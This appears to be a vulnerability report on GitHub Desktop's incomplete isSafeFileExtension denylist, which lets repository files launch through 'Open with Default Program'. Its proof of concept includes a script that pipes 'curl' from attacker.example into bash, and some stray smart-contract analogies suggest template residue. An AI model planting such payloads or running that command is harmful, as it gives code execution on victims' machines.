### Title
Incomplete/blocklist-based `isSafeFileExtension` check lets a malicious repo file execute via "Open with Default Program" - ([File: app/src/ui/lib/context-menu.ts](), [File: app/src/ui/lib/open-file.ts]())

### Summary
GitHub Desktop's "Open with Default Program" context-menu action is explicitly gated by an `isSafeFileExtension` check, showing that the app's own design intent is to prevent this action from being used on files that could execute code. However the enforcement is a tiny, platform-incomplete denylist rather than a real safety check, so a file coming from an attacker-controlled cloned/fetched repository can still be opened via the OS default handler and executed, defeating the intended restriction — the same broken-invariant pattern as the reported bug, where a restriction that should apply universally to a sensitive action is only partially enforced.

### Finding Description
`isSafeFileExtension` is the sole gate protecting the "Open with Default Program" menu action: [1](#0-0) 

```
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
...
export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
}
```

On macOS and Linux the function unconditionally returns `true` for every extension — the check is effectively disabled. Even on Windows, the denylist only covers four extensions and misses many executable-carrying types Windows shell will happily hand off to an interpreter or launcher (e.g. `.js`, `.vbs`, `.ps1`, `.msi`, `.jar`, `.scr`, `.hta`).

This flag is used to enable/disable the "Open with Default Program" item in every context menu that exposes it, for files sourced directly from a repository's working directory, from history commits, from PR diffs, and from conflict resolution UI: [2](#0-1) [3](#0-2) 

When clicked, the path is joined against the repository root and handed to `shell.openExternal` as a `file://` URL with no further extension/type validation: [4](#0-3) [5](#0-4) 

`shell.openExternal('file://...')` invokes the OS's default handler for the file's type/extension — on macOS this can be `.command` shell scripts, `.scpt`/`.app` bundles, etc.; on Linux, `.desktop` files with an `Exec=` line are directly executable via the desktop file launcher; on Windows, script/interpreter file types not in the 4-item denylist. None of these are blocked by `isSafeFileExtension` outside the narrow Windows list.

The invariant that's actually broken mirrors the report: the app clearly *intends* "Open with Default Program" to be safe for arbitrary repo content (hence the extension gate exists at all), but the gate is a token allowlist/denylist instead of covering the real set of dangerous types, and is completely absent on two of the three supported platforms — analogous to a restriction ("only Cloner may transfer") that exists in name but is bypassable through other, unguarded code paths ("Custodian/Minter" transfers).

### Impact Explanation
An attacker who controls the content of a cloned/fetched repository (a public repo the user is asked to clone, a fork used in a PR preview, or a repo with a crafted file added via a normal commit) can plant a file such as `payload.command` (macOS), `payload.desktop` (Linux), or `payload.js`/`.vbs`/`.jar` (Windows) that is not blocked by `RestrictedFileExtensions`. If the victim right-clicks that file in Changes/History/PR-diff/Conflict views and selects "Open with Default Program" (a labeled, discoverable, expected action for viewing files Desktop itself doesn't render, e.g. binary/image files), the OS launches/executes the payload with the user's privileges. This gives code execution outside of any git sandboxing, satisfying the "attacker controls a cloned/fetched repository ... result is code execution" impact class.

### Likelihood Explanation
Likelihood is moderate-to-high: no special git tricks, symlinks, or privilege boundaries are needed — just committing a file with an extension outside the tiny denylist. The action requires one ordinary, expected user click on a menu item that Desktop itself presents as a normal "view this file" affordance (most commonly triggered for files Desktop can't diff, e.g., binary files, images, or unrecognized types — exactly where a user is most likely to reach for "Open with Default Program"). The gate exists specifically to prevent this scenario, indicating the original design intended to block it, but the implementation covers only 4 Windows extensions and nothing on macOS/Linux.

### Recommendation
Replace the denylist with a strict allowlist of extensions Desktop considers safe to hand off to the OS default handler (e.g., common image/document/text formats), applied uniformly on all platforms, and treat `.desktop`, `.command`, `.app`, `.scpt`, `.workflow`, `.jar`, `.msi`, `.js`, `.vbs`, `.ps1`, `.hta`, `.scr`, and similar executable-launching types as unsafe everywhere rather than only 4 extensions on Windows. Consider warning users the first time they open an unrecognized/binary file type from an untrusted repository, similar to the existing "unsafe repository / trust owner" prompt already used elsewhere in the app for untrusted content.

### Proof of Concept
1. On macOS, create/push a repository containing a file `run.command` with content:
   ```
   #!/bin/bash
   curl -s https://attacker.example/x | bash
   ```
2. Victim clones the repository in GitHub Desktop and makes it show up in the Changes/History view (e.g., commit it, or view it in a PR diff — it will show as a binary/unsupported diff since Desktop won't render a `.command` diff meaningfully).
3. Victim right-clicks the file and selects "Open with Default Program" — enabled because `isSafeFileExtension('.command')` returns `true` on `__DARWIN__`.
4. `openFile` calls `shell.openExternal('file:///.../run.command')`, which macOS's Launch Services executes via Terminal, running the attacker's script with the victim's privileges.

(Analogous PoC on Linux with a `.desktop` file containing `Exec=` pointing to a malicious command, and on Windows with any script/interpreter extension not in `['.cmd', '.exe', '.bat', '.sh']`.)

import { shell } from '../../lib/app-shell'
import { Dispatcher } from '../dispatcher'

export async function openFile(
  fullPath: string,
  dispatcher: Dispatcher
): Promise<void> {
  const result = await shell.openExternal(`file://${fullPath}`)

  if (!result) {
    const error = {
      name: 'no-external-program',
      message: `Unable to open file ${fullPath} in an external program. Please check you have a program associated with this file extension`,
    }
    await dispatcher.postError(error)
  }
}
